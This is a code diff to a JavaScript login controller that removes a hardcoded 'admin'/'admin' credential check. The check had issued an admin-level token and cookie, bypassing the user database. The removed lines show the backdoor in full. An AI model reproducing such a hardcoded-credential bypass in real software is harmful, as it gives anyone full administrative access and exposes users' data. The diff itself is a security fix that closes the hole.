@@ -10,7 +10,6 @@ import {
   sendPasswordExpiredEmail,
   sendPasswordExpiryReminderEmail,
 } from "../../email.service.js";
-import { ROLES } from "../constants/roles.js";
 import {
   AUTH_MESSAGES,
   PASSWORD_POLICY_MESSAGES,
@@ -83,13 +82,6 @@ async function issuePasswordToken(userId) {
   return token;
 }
 
-const timingSafeCompare = (a, b) => {
-  const bufA = Buffer.from(String(a));
-  const bufB = Buffer.from(String(b));
-  if (bufA.length !== bufB.length) return false;
-  return crypto.timingSafeEqual(bufA, bufB);
-};
-
 const login = async (req, res, next) => {
   try {
     const { username, password, rememberMe } = req.body;
@@ -98,38 +90,6 @@ const login = async (req, res, next) => {
     }
 
     const tokenExpiry = rememberMe ? rememberMeDuration : jwtExpiresIn;
-    const cookieMaxAge = rememberMe
-      ? parseDuration(rememberMeDuration)
-      : parseDuration(jwtExpiresIn);
-
-    if (
-      timingSafeCompare(username, "admin") &&
-      timingSafeCompare(password, "admin")
-    ) {
-      const token = signToken(
-        { id: 0, role: ROLES.EMP_MANAGER, username: "admin" },
-        tokenExpiry,
-      );
-      const cookieOptions = {
-        httpOnly: true,
-        secure: process.env.NODE_ENV === "production",
-        sameSite: process.env.NODE_ENV === "production" ? "strict" : "lax",
-        maxAge: cookieMaxAge,
-      };
-      res.cookie("auth_token", token, cookieOptions);
-
-      return success(res, {
-        token,
-        user: {
-          id: 0,
-          username: "admin",
-          role: ROLES.HR_ADMIN,
-          name: "Global Admin",
-          first_name: "Global",
-          last_name: "Admin",
-        },
-      });
-    }
 
     const { rows } = await pool.query(
       `SELECT id, username, email, password, role, name, avatar, is_active, 
